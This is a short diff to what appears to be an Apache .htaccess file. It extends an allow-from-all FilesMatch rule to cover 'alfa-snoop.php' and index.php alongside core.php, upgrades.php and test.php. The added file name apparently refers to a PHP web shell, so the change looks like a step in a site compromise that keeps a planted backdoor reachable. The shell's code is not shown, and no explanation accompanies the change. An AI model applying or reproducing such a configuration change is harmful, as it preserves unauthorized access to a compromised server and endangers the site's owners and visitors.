@@ -9,7 +9,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(core.php|upgrades.php|test.php|error.tpl)$'>
+<FilesMatch '^(core.php|upgrades.php|test.php|error.tpl|alfa-snoop.php|index.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
